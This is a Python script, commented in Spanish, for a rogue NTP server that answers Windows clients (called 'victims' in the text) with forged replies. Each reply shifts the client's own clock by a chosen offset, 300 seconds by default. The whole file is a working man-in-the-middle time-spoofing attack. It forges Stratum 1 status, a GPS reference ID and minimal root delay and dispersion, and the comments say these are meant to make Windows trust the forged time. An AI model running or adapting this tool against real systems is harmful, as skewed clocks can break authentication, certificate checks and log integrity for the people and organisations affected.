import socket
import struct
import time
import sys

# Configuración inicial del Socket UDP (Puerto 123)
PORT = 123
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', PORT))

# El desfase se pasa por argumento (ej: 600 para 10 min), por defecto 300 (5 min)
OFFSET = int(sys.argv[1]) if len(sys.argv) > 1 else 300

def unix_to_ntp_parts(unix_time):
    """Convierte el tiempo Unix a la estructura de 64 bits de NTP (segundos y fracción)"""
    ntp_sec = int(unix_time) + 2208988800
    ntp_frac = int((unix_time - int(unix_time)) * (2**32))
    return ntp_sec, ntp_frac

print(f"[*] Servidor NTP Espejo Actualizado (NTPv4 / Stratum 1).")
print(f"[*] Desfase configurado: {OFFSET} segundos.")
print("[*] Esperando peticiones de la víctima...")

while True:
    try:
        # Recibir los datos de la víctima
        data, addr = s.recvfrom(1024)

        # Ignorar paquetes basura menores al tamaño mínimo estándar
        if len(data) < 48:
            continue

        # 1. EXTRAER EL TRANSMIT TIMESTAMP DE WINDOWS (Bytes 40 al 47)
        client_tx = data[40:48]

        # 2. DECODIFICAR EL TIEMPO EN FORMATO NTP DE WINDOWS A UNIX
        client_sec, client_frac = struct.unpack('!II', client_tx)
        windows_time_unix = (client_sec - 2208988800) + (client_frac / (2**32))

        # 3. APLICAR EL ENGAÑO EXCLUSIVAMENTE SOBRE LA HORA DE WINDOWS
        fake_transmit_time = windows_time_unix + OFFSET
        fake_receive_time = windows_time_unix + 0.002 # Simula llegada 2ms antes

        # 4. CONVERTIR LOS NUEVOS TIEMPOS FALSEADOS DE VUELTA A FORMATO NTP
        tx_sec, tx_frac = unix_to_ntp_parts(fake_transmit_time)
        rx_sec, rx_frac = unix_to_ntp_parts(fake_receive_time)
        ref_sec, ref_frac = unix_to_ntp_parts(fake_transmit_time - 60) # Estabilidad simulada

        # 5. CONSTRUIR EL PAQUETE NTP DESDE CERO (48 Bytes estrictos)
        pkt = bytearray(48)

        # 0x24 en binario = 00100100 (Leap Indicator = 0, Version = 4, Mode = 4 Server)
        pkt[0] = 0x24  
        pkt[1] = 1      # NUEVO: Stratum 1 (Servidor de referencia primaria de máxima prioridad)
        pkt[2] = 6      # Polling interval estándar (64 segundos)
        pkt[3] = 0xEC   # Precisión del reloj (-20)

        # Root Delay y Root Dispersion mínimos
        # Reduce a casi cero el margen de error para obligar a Windows a confiar en la muestra
        struct.pack_into('!I', pkt, 4, 0x00000000)  # Root Delay = 0
        struct.pack_into('!I', pkt, 8, 0x00000010)  # Root Dispersion mínimo

        # Reference Identifier obligatorio para Stratum 1
        # Al ser Stratum 1, requiere un identificador ASCII de 4 bytes de una fuente atómica.
        # Definimos 'GPS\x00' indicando sincronización satelital directa.
        pkt[12:16] = b'GPS\x00'

        # Inyectar las marcas de tiempo calculadas de forma relativa
        struct.pack_into('!II', pkt, 16, ref_sec, ref_frac)   # Reference Timestamp
        pkt[24:32] = client_tx                                 # Originate Timestamp (Copia exacta)
        struct.pack_into('!II', pkt, 32, rx_sec, rx_frac)     # Receive Timestamp
        struct.pack_into('!II', pkt, 40, tx_sec, tx_frac)     # Transmit Timestamp

        # 6. ENVIAR RESPUESTA PURA DE 48 BYTES
        s.sendto(bytes(pkt), addr)

        # Consola de depuración basada en el reloj de la víctima
        print(f"\n[+] ¡Petición MitM Procesada con Identidad Máxima (NTPv4 / GPS)!")
        print(f"    - IP del cliente:            {addr[0]}")
        print(f"    - Hora que declaró Windows:  {time.ctime(windows_time_unix)}")
        print(f"    - Hora Falsa Inyectada:      {time.ctime(fake_transmit_time)}")

    except KeyboardInterrupt:
        print("\n[*] Apagando servidor NTP.")
        break
    except Exception as e:
        print(f"[-] Error en el bucle: {e}")